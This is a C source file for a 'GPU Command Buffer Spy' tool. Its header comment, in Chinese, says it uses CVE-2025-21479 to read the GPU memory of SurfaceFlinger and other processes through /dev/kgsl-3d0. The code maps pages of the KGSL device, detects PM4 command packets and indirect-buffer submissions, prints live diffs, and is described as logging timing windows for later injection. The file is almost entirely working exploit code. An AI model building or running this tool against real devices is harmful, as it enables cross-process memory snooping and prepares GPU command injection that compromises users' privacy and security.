/*
 * gpu_cmdbuf_spy.c - GPU Command Buffer Real-time Spy
 *
 * 利用 CVE-2025-21479 Cross-FD GPU Memory Access 持續監控
 * SurfaceFlinger 和其他 GPU 進程的命令緩衝區活動。
 *
 * 功能：
 * 1. 實時檢測 GPU 內存中的變化
 * 2. 識別活動的命令緩衝區
 * 3. 追蹤 IB (Indirect Buffer) 提交模式
 * 4. 記錄可注入的窗口時機
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <time.h>
#include <sys/time.h>
#include <signal.h>

#define PAGE_SIZE 4096
#define MAX_WATCH_PAGES 256

/* PM4 Opcodes */
#define CP_NOP 0x10
#define CP_IB 0x3F
#define CP_IB_PFE 0x37
#define CP_MEM_WRITE 0x3D
#define CP_REG_WRITE 0x3C
#define CP_WAIT_IDLE 0x26
#define CP_DRAW_INDX 0x22
#define CP_EVENT_WRITE 0x46

/* Page state */
typedef struct
{
    uint64_t offset;
    uint32_t checksum;
    uint32_t last_checksum;
    int change_count;
    int has_pm4;
    int has_ib;
    time_t last_change;
    void *snapshot; /* Last known content */
} watch_page_t;

typedef struct
{
    int kgsl_fd;
    watch_page_t pages[MAX_WATCH_PAGES];
    int page_count;

    /* Stats */
    int total_changes;
    int pm4_pages;
    int ib_submissions;
    int active_buffers;
} spy_state_t;

static volatile int running = 1;

static void sigint_handler(int sig)
{
    (void)sig;
    running = 0;
}

/* Fast checksum for change detection */
static uint32_t page_checksum(const void *data, size_t size)
{
    const uint32_t *p = (const uint32_t *)data;
    uint32_t sum = 0;
    for (size_t i = 0; i < size / 4; i++)
    {
        sum ^= p[i];
        sum = (sum << 1) | (sum >> 31);
    }
    return sum;
}

/* Check if buffer contains PM4 packets */
static int has_pm4_content(const uint32_t *buf, size_t dwords)
{
    int pm4_count = 0;

    for (size_t i = 0; i < dwords; i++)
    {
        uint32_t hdr = buf[i];

        /* Type 3 packet */
        if ((hdr & 0xC0000000) == 0xC0000000)
        {
            int opcode = (hdr >> 8) & 0xFF;
            if (opcode == CP_NOP || opcode == CP_IB || opcode == CP_IB_PFE ||
                opcode == CP_MEM_WRITE || opcode == CP_REG_WRITE ||
                opcode == CP_WAIT_IDLE || opcode == CP_DRAW_INDX ||
                opcode == CP_EVENT_WRITE)
            {
                pm4_count++;
            }
        }
        /* Type 7 packet (A6xx) */
        else if ((hdr & 0xF0000000) == 0x70000000)
        {
            pm4_count++;
        }
        /* Type 4 packet (A6xx reg write) */
        else if ((hdr & 0xF0000000) == 0x40000000)
        {
            pm4_count++;
        }
    }

    return pm4_count > 3; /* At least a few PM4 packets */
}

/* Check for IB commands */
static int find_ib_commands(const uint32_t *buf, size_t dwords,
                            uint64_t *ib_addrs, int max_ibs)
{
    int ib_count = 0;

    for (size_t i = 0; i < dwords && ib_count < max_ibs; i++)
    {
        uint32_t hdr = buf[i];

        /* CP_INDIRECT_BUFFER: Type3 with opcode 0x3F */
        if ((hdr & 0xC0000000) == 0xC0000000)
        {
            int opcode = (hdr >> 8) & 0xFF;
            int count = ((hdr >> 16) & 0x3FFF) + 1;

            if ((opcode == CP_IB || opcode == CP_IB_PFE) && count >= 3)
            {
                if (i + 3 < dwords)
                {
                    uint64_t ib_addr = buf[i + 1] | ((uint64_t)buf[i + 2] << 32);
                    ib_addrs[ib_count++] = ib_addr;
                }
                i += count;
            }
            else
            {
                i += count;
            }
        }
    }

    return ib_count;
}

/* Initialize watched pages */
static void init_watch_pages(spy_state_t *state, uint64_t start, uint64_t end, uint64_t step)
{
    state->page_count = 0;

    for (uint64_t off = start; off < end && state->page_count < MAX_WATCH_PAGES; off += step)
    {
        void *addr = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, state->kgsl_fd, off);
        if (addr == MAP_FAILED)
            continue;

        /* Check if page has content */
        const uint32_t *buf = (const uint32_t *)addr;
        int has_data = 0;
        for (int i = 0; i < 256; i++)
        {
            if (buf[i] != 0)
            {
                has_data = 1;
                break;
            }
        }

        if (has_data)
        {
            watch_page_t *wp = &state->pages[state->page_count];
            wp->offset = off;
            wp->checksum = page_checksum(addr, PAGE_SIZE);
            wp->last_checksum = wp->checksum;
            wp->change_count = 0;
            wp->has_pm4 = has_pm4_content(buf, 1024);
            wp->has_ib = 0;
            wp->last_change = time(NULL);
            wp->snapshot = malloc(PAGE_SIZE);
            if (wp->snapshot)
            {
                memcpy(wp->snapshot, addr, PAGE_SIZE);
            }

            state->page_count++;
            if (wp->has_pm4)
                state->pm4_pages++;
        }

        munmap(addr, PAGE_SIZE);
    }

    printf("[*] Initialized %d watch pages (%d with PM4 content)\n",
           state->page_count, state->pm4_pages);
}

/* Scan for changes */
static void scan_for_changes(spy_state_t *state)
{
    for (int i = 0; i < state->page_count; i++)
    {
        watch_page_t *wp = &state->pages[i];

        void *addr = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, state->kgsl_fd, wp->offset);
        if (addr == MAP_FAILED)
            continue;

        uint32_t new_checksum = page_checksum(addr, PAGE_SIZE);

        if (new_checksum != wp->checksum)
        {
            wp->last_checksum = wp->checksum;
            wp->checksum = new_checksum;
            wp->change_count++;
            wp->last_change = time(NULL);
            state->total_changes++;

            /* Check for PM4 content */
            const uint32_t *buf = (const uint32_t *)addr;
            wp->has_pm4 = has_pm4_content(buf, 1024);

            /* Check for IB commands */
            uint64_t ib_addrs[16];
            int ib_count = find_ib_commands(buf, 1024, ib_addrs, 16);
            if (ib_count > 0)
            {
                wp->has_ib = 1;
                state->ib_submissions += ib_count;

                printf("\n[IB] Page 0x%lx changed, found %d IB commands:\n",
                       (unsigned long)wp->offset, ib_count);
                for (int j = 0; j < ib_count && j < 4; j++)
                {
                    printf("     -> IB[%d]: 0x%016lx\n", j, (unsigned long)ib_addrs[j]);
                }
            }

            /* Update snapshot */
            if (wp->snapshot)
            {
                memcpy(wp->snapshot, addr, PAGE_SIZE);
            }
        }

        munmap(addr, PAGE_SIZE);
    }
}

/* Print active buffer summary */
static void print_summary(spy_state_t *state)
{
    int active = 0;
    time_t now = time(NULL);

    printf("\n╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  ACTIVE GPU COMMAND BUFFERS                                   ║\n");
    printf("╠═══════════════════════════════════════════════════════════════╣\n");

    for (int i = 0; i < state->page_count; i++)
    {
        watch_page_t *wp = &state->pages[i];

        if (wp->change_count > 0 && (now - wp->last_change) < 10)
        {
            active++;
            printf("║ 0x%08lx | Changes: %4d | PM4: %s | IB: %s | Age: %lds ║\n",
                   (unsigned long)wp->offset,
                   wp->change_count,
                   wp->has_pm4 ? "YES" : "NO ",
                   wp->has_ib ? "YES" : "NO ",
                   now - wp->last_change);
        }
    }

    printf("╠═══════════════════════════════════════════════════════════════╣\n");
    printf("║ Active: %3d | Total Changes: %6d | IB Submissions: %5d    ║\n",
           active, state->total_changes, state->ib_submissions);
    printf("╚═══════════════════════════════════════════════════════════════╝\n");

    state->active_buffers = active;
}

/* Detailed dump of a page */
static void dump_page_diff(watch_page_t *wp, const void *current)
{
    if (!wp->snapshot)
        return;

    const uint32_t *old = (const uint32_t *)wp->snapshot;
    const uint32_t *new = (const uint32_t *)current;

    printf("\n[DIFF] Page 0x%lx changes:\n", (unsigned long)wp->offset);

    int diff_count = 0;
    for (int i = 0; i < PAGE_SIZE / 4 && diff_count < 20; i++)
    {
        if (old[i] != new[i])
        {
            printf("  [+%04x] %08x -> %08x\n", i * 4, old[i], new[i]);
            diff_count++;
        }
    }
    if (diff_count >= 20)
    {
        printf("  ... more changes ...\n");
    }
}

/* Monitor mode */
static void monitor_mode(spy_state_t *state, int duration)
{
    printf("\n╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  GPU COMMAND BUFFER SPY - MONITOR MODE                        ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    signal(SIGINT, sigint_handler);

    /* Initialize watch pages */
    init_watch_pages(state, 0x1000, 0x200000, 0x1000);

    printf("[*] Monitoring for %d seconds (Ctrl+C to stop)\n\n", duration);

    time_t start = time(NULL);
    int last_summary = 0;

    while (running && (time(NULL) - start) < duration)
    {
        scan_for_changes(state);

        /* Print summary every 5 seconds */
        int elapsed = (int)(time(NULL) - start);
        if (elapsed > 0 && elapsed % 5 == 0 && elapsed != last_summary)
        {
            print_summary(state);
            last_summary = elapsed;
        }

        usleep(10000); /* 10ms sampling */
    }

    print_summary(state);
}

/* Find hottest pages (most changes) */
static void find_hottest_pages(spy_state_t *state, int top_n)
{
    printf("\n[*] Top %d Most Active Pages:\n", top_n);

    /* Simple selection sort for top N */
    int indices[MAX_WATCH_PAGES];
    for (int i = 0; i < state->page_count; i++)
        indices[i] = i;

    for (int i = 0; i < top_n && i < state->page_count; i++)
    {
        int max_idx = i;
        for (int j = i + 1; j < state->page_count; j++)
        {
            if (state->pages[indices[j]].change_count >
                state->pages[indices[max_idx]].change_count)
            {
                max_idx = j;
            }
        }
        if (max_idx != i)
        {
            int tmp = indices[i];
            indices[i] = indices[max_idx];
            indices[max_idx] = tmp;
        }

        watch_page_t *wp = &state->pages[indices[i]];
        if (wp->change_count > 0)
        {
            printf("  #%d: 0x%08lx - %d changes, PM4=%s, IB=%s\n",
                   i + 1, (unsigned long)wp->offset, wp->change_count,
                   wp->has_pm4 ? "yes" : "no",
                   wp->has_ib ? "yes" : "no");
        }
    }
}

/* Interactive mode - watch specific pages */
static void watch_page(spy_state_t *state, uint64_t offset)
{
    printf("\n[*] Watching page 0x%lx in real-time...\n", (unsigned long)offset);
    printf("[*] Press Ctrl+C to stop\n\n");

    signal(SIGINT, sigint_handler);

    uint32_t *last_content = malloc(PAGE_SIZE);
    if (!last_content)
    {
        printf("[-] malloc failed\n");
        return;
    }

    /* Initial read */
    void *addr = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, state->kgsl_fd, offset);
    if (addr == MAP_FAILED)
    {
        printf("[-] Cannot map offset: %s\n", strerror(errno));
        free(last_content);
        return;
    }
    memcpy(last_content, addr, PAGE_SIZE);
    munmap(addr, PAGE_SIZE);

    int changes = 0;

    while (running)
    {
        addr = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, state->kgsl_fd, offset);
        if (addr == MAP_FAILED)
        {
            usleep(50000);
            continue;
        }

        /* Check for changes */
        if (memcmp(addr, last_content, PAGE_SIZE) != 0)
        {
            changes++;

            struct timeval tv;
            gettimeofday(&tv, NULL);
            printf("\n[%ld.%03ld] Change #%d detected:\n",
                   tv.tv_sec % 1000, tv.tv_usec / 1000, changes);

            /* Print diffs */
            const uint32_t *old = (const uint32_t *)last_content;
            const uint32_t *new = (const uint32_t *)addr;

            int diff_count = 0;
            for (int i = 0; i < PAGE_SIZE / 4 && diff_count < 16; i++)
            {
                if (old[i] != new[i])
                {
                    printf("  [%04x] %08x -> %08x", i * 4, old[i], new[i]);

                    /* Try to decode PM4 */
                    if ((new[i] & 0xC0000000) == 0xC0000000)
                    {
                        int op = (new[i] >> 8) & 0xFF;
                        printf("  (Type3 op=0x%02x)", op);
                    }
                    printf("\n");
                    diff_count++;
                }
            }

            memcpy(last_content, addr, PAGE_SIZE);
        }

        munmap(addr, PAGE_SIZE);
        usleep(5000); /* 5ms */
    }

    printf("\n[*] Total changes observed: %d\n", changes);
    free(last_content);
}

/* Main */
int main(int argc, char *argv[])
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════════╗\n");
    printf("║  GPU Command Buffer Spy - CVE-2025-21479 Research Tool                ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════════╝\n\n");

    spy_state_t state = {0};

    state.kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (state.kgsl_fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] KGSL FD: %d\n", state.kgsl_fd);

    if (argc < 2)
    {
        printf("\nUsage: %s <mode> [options]\n", argv[0]);
        printf("  monitor <seconds>    - Monitor all GPU pages for changes\n");
        printf("  watch <offset>       - Watch specific page in real-time\n");
        printf("  scan                 - One-time scan for active buffers\n");
        close(state.kgsl_fd);
        return 1;
    }

    if (strcmp(argv[1], "monitor") == 0)
    {
        int duration = (argc > 2) ? atoi(argv[2]) : 30;
        monitor_mode(&state, duration);
        find_hottest_pages(&state, 10);
    }
    else if (strcmp(argv[1], "watch") == 0)
    {
        if (argc < 3)
        {
            printf("[-] Need offset for watch\n");
            close(state.kgsl_fd);
            return 1;
        }
        uint64_t offset = strtoull(argv[2], NULL, 0);
        watch_page(&state, offset);
    }
    else if (strcmp(argv[1], "scan") == 0)
    {
        init_watch_pages(&state, 0x1000, 0x400000, 0x1000);
        scan_for_changes(&state);
        print_summary(&state);
    }
    else
    {
        printf("[-] Unknown mode: %s\n", argv[1]);
    }

    /* Cleanup */
    for (int i = 0; i < state.page_count; i++)
    {
        if (state.pages[i].snapshot)
        {
            free(state.pages[i].snapshot);
        }
    }

    close(state.kgsl_fd);
    return 0;
}
